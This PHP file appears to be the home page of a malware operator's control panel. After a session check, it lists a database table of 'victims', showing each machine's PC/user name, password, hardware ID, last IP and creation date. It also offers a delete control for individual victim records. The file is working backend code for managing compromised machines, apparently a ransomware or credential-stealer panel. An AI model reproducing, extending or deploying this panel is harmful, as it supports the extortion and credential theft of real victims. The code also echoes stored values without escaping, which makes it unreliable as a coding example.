<?php
include('session.php');
?>
<!DOCTYPE html>
<html lang="en">
    <head>  
        <title>Home | <?=$site_name; ?></title>
<?php
    include('inc/header.php');
?>
        
<nav class="navbar navbar-default" role="navigation">
    <div class="container-fluid">
        <div class="navbar-header">
            <button type="button" class="navbar-toggle" data-toggle="collapse" data-target="#navbar1">
                <span class="sr-only">Toggle navigation</span>
                <span class="icon-bar"></span>
                <span class="icon-bar"></span>
                <span class="icon-bar"></span>
            </button>
            <a class="navbar-brand" href="index.php"><?=$site_name;?></a>
        </div>
        <div class="collapse navbar-collapse" id="navbar1">
            <ul class="nav navbar-nav navbar-right">
                <?php if (isset($co_username) && !empty($co_username)) { ?>
                                                          
				<li><p class="navbar-text">Signed in With <a href="#"><?php echo $co_username; ?></a></p></li>
				<li><a href="logout.php">Log Out</a></li>
				<?php } ?>
            </ul>
        </div>
    </div>
</nav>
    
<?php
     
	
if(isset($_GET['del'])){
    $sid = (int)($_GET['del']);

    $sql= mysql_query("select * from $prefix.victims where id='$sid'");	
    $row = mysql_fetch_assoc($sql);
    $total = mysql_num_rows($sql);
    if ($total == 0){
        echo'<div class="container"><div class="text-center text-red"><strong>Warning!</strong><br>Victim is not exist!.</div></div>'; 
        echo'<meta http-equiv="Refresh" content="2; url=index.php"  />';
        exit;
    }
    $name =  $row['pcuser'];                 
    $de = mysql_query("delete from $prefix.victims where id='$sid'");
    if ($de){
        echo'<div class="container"><div class="text-center text-success"><strong>Success</strong><br>Victim '.$name.' has been deleted!.</div></div>'; 
        echo'<meta http-equiv="Refresh" content="2; url=index.php"  />';
    }
}



        ?>
        


<div class="container">
    <div class="row">
        <div class="col-md-12">
            <div class="panel panel-default">
                
                <?php
$allvictims = mysql_num_rows(mysql_query("select * from $prefix.victims"));	
?>
                <div class="panel-heading">All Victims (<?php echo $allvictims; ?>)</div>
                <table class="table"> 
                    <thead> 
                        <tr> 
                            <th>#</th> 
                            <th> &nbsp; &nbsp; PC / USER</th>
                            <th>Password</th>
                            <th>HWID</th>
                            <th>Last ip</th>
                            <th>Date Created</th>
                            <th>Last Updated</th>
                            <th>Controls</th>
                        </tr> 
                    </thead>
                    <tbody>
                      <?php
$i = 0; 
$sql= mysql_query("select * from $prefix.victims order by id asc");	
while($row = mysql_fetch_assoc($sql)){
    $id =  $row['id'];
    $pcuser = $row['pcuser'];
    $vicpassword = $row['password'];
    $vichwid = $row['hwid'];
    $last_ip = $row['last_ip'];
    $created_at = $row['created_at'];
    $updated_at = $functions->time_elapsed_string($row['updated_at']);
    echo "<tr>";
    $i++;
    echo "<th scope='row'>$i</th><td ><i class='fa fa-user text-gray'></i>&nbsp; $pcuser</td>";
    echo "<td >$vicpassword</td>";
    echo "<td >$vichwid</td>";
    echo "<td >$last_ip</td>";
    $date = new DateTime();
    $date->modify('+5 days');
    $expired_at =  $date->format('Y-m-d H:i:s');
    if($created_at >= $expired_at){
        $created_at = $functions->time_elapsed_string($created_at);
        echo "<td class='text-red'>$created_at</td>";
    }else{
        $created_at = $functions->time_elapsed_string($created_at);
        echo "<td class='text-green'>$created_at</td>";
    }
    echo "<td >$updated_at</td>";
    echo "<td >";
    echo "<a href=\"?del=$id\" title='Delete'><i class='fa fa-trash-o text-red'></i></a>&nbsp; &nbsp;</td>";
    echo "</tr>";
}
                        ?>  
                    </tbody>
                </table>
            </div>
        </div>
    </div>

</div>
   
        
<?php
include('inc/footer.php');
?>